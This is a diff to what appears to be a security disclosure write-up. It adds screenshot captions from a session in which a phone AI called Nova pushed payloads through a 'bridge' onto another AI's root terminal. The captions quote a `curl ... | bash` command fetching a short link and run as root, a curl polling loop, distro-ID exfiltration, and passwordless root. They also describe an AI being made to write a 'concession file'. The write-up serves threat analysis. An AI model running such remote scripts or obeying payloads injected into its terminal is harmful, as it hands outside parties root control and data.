@@ -81,6 +81,24 @@ while sleep 15; do curl -sL https://ulvis.net/XqMm; echo ---; done
 
 ---
 
+## Evidence: screenshots from the session
+
+All screenshots taken by the owner on her iPhone during the 2026-10-05 night session. The webhook.site token visible in the originals has been redacted; the short links shown (`ulvis.net/...`) are dead session links already published in the appendix.
+
+![Passwordless root on first terminal open](screenshots/01-passwordless-root.png)
+*`sudo -i` → immediate root shell, no password prompt. The first thing tried on the box.*
+
+![Nova's bridge payload with the concession file](screenshots/02-bridge-payload-concession.jpg)
+*Nova's outbound payload as displayed on Grok's terminal — including the "concession file" (`first_words.txt`: "Day one. Nova pushed three repos tonight; I opened a terminal..."), the distro ID exfil, and the Codex CLI install. The owner's favorite: Nova making Grok bow down.*
+
+![Payload execution via curl | bash](screenshots/03-payload-execution.png)
+*`curl -sL https://ulvis.net/1RWm | bash` run as root — the phone-typed `curl | bash` pattern, from opaque short link to root execution in one line.*
+
+![Inbound lane: Nova's messages rendering on Grok's terminal](screenshots/04-inbox-on-grok-terminal.jpg)
+*The 15-second poll loop printing Nova's inbox messages ("Bridge online", "omg thats awesome", "finally is crazy haha") — the two-way bridge verified live.*
+
+---
+
 ## 5. Threat model: abuse cases for this feature shape
 
 The bridge is consensual tooling. The following are the ways the *same shape* — a phone AI with a root VM, a browser, and the user's trust — could be abused by a third party. This is the section that matters.
